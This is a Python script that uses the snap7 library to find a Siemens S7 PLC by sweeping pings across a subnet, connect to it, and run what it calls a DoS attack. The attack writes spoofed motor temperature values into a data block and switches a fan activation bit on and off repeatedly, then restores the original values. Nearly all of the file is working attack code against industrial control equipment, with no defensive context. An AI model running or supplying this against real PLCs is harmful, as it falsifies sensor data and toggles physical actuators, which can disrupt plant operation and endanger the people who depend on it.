import snap7
import time
import os

# Configuration - Adjust these based on your actual setup
PLC_IP = None  # Initialize as None, will attempt to discover if not set manually
PLC_RACK = 0
PLC_SLOT = 1
DB_NUMBER_FC1 = 1  # Assuming FC1 uses DB1 for holding data.  You'll need to determine this in your project.
DB_NUMBER_FC2 = 2  # Assuming FC2 uses DB2 for holding data.  You'll need to determine this in your project.
MOTOR_TEMP_ADDRESS = 2 # Offset in bytes from the beginning of DB1, where Motor_Temp is stored (assuming DB1 is being used)
ACTIVATION_FAN_A_ADDRESS = 0 # Offset in bytes from the beginning of DB1, where Activate_Fan_A is stored (assuming DB1 is being used)

# Function to attempt to discover the PLC's IP address (very basic and might not work in all environments)
def discover_plc_ip():
    try:
        # This is a very basic method and relies on pinging a common IP range.
        #  It's not guaranteed to work in all network configurations.
        #  A proper discovery would involve more sophisticated network scanning.
        print("Attempting to discover PLC IP address...")
        for i in range(1, 255):
            ip = f"192.168.1.{i}"  # Adjust the IP range if needed
            response = os.system(f"ping -n 1 -w 500 {ip} > nul")  # Windows ping command
            if response == 0:
                print(f"Found PLC at IP address: {ip}")
                return ip
    except Exception as e:
        print(f"Error during IP discovery: {e}")
    return None


def read_motor_temp(plc, db_number, offset):
    """Reads the motor temperature from the specified DB."""
    try:
      read_data = plc.db_read(db_number, offset, 2)  # Read 2 bytes for an INT
      motor_temp = snap7.util.get_int(read_data, 0)
      return motor_temp
    except Exception as e:
        print(f"Error reading Motor_Temp: {e}")
        return None

def write_motor_temp(plc, db_number, offset, value):
    """Writes a new motor temperature to the specified DB."""
    try:
        write_data = bytearray(2)
        snap7.util.set_int(write_data, 0, value)
        plc.db_write(db_number, offset, write_data)
    except Exception as e:
        print(f"Error writing Motor_Temp: {e}")

def read_activation_fan_A(plc, db_number, offset):
        """Reads the value of Activate_Fan_A"""
        try:
            read_data = plc.db_read(db_number, offset, 1) # Read 1 byte for a BOOL
            activate_fan_a = snap7.util.get_bool(read_data, 0, 0)
            return activate_fan_a
        except Exception as e:
            print(f"Error reading Activate_Fan_A: {e}")
            return None

def write_activation_fan_A(plc, db_number, offset, value):
        """Writes the value of Activate_Fan_A"""
        try:
            write_data = bytearray(1)
            snap7.util.set_bool(write_data, 0, 0, value)
            plc.db_write(db_number, offset, write_data)
        except Exception as e:
            print(f"Error writing Activate_Fan_A: {e}")

def dos_attack(plc, db_number_fc1, motor_temp_address, activation_fan_a_address):
    """Performs a simple DoS attack by rapidly changing the motor temperature
    and toggling Activate_Fan_A, causing high CPU usage."""

    try:
        print("Starting DoS attack...")
        original_motor_temp = read_motor_temp(plc, db_number_fc1, motor_temp_address)
        original_activation_fan_a = read_activation_fan_A(plc, db_number_fc1, activation_fan_a_address)

        for i in range(100):  # Repeat the attack a few times
            for temp in range(200, 500, 10):  # Vary motor temperature
                write_motor_temp(plc, db_number_fc1, motor_temp_address, temp)
                time.sleep(0.01)  # Short delay

            # Toggle Activate_Fan_A rapidly
            write_activation_fan_A(plc, db_number_fc1, activation_fan_a_address, True)
            time.sleep(0.01)
            write_activation_fan_A(plc, db_number_fc1, activation_fan_a_address, False)
            time.sleep(0.01)


        # Restore original values (important!)
        print("Restoring original values...")
        if original_motor_temp is not None:
            write_motor_temp(plc, db_number_fc1, motor_temp_address, original_motor_temp)

        if original_activation_fan_a is not None:
            write_activation_fan_A(plc, db_number_fc1, activation_fan_a_address, original_activation_fan_a)
        print("DoS attack completed.")

    except Exception as e:
        print(f"Error during DoS attack: {e}")

def main():
    global PLC_IP
    if PLC_IP is None:
        PLC_IP = discover_plc_ip()
        if PLC_IP is None:
            print("PLC IP address could not be discovered. Please set it manually in the script.")
            return

    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        dos_attack(plc, DB_NUMBER_FC1, MOTOR_TEMP_ADDRESS, ACTIVATION_FAN_A_ADDRESS)

    except Exception as e:
        print(f"Error connecting to PLC: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")

if __name__ == "__main__":
    main()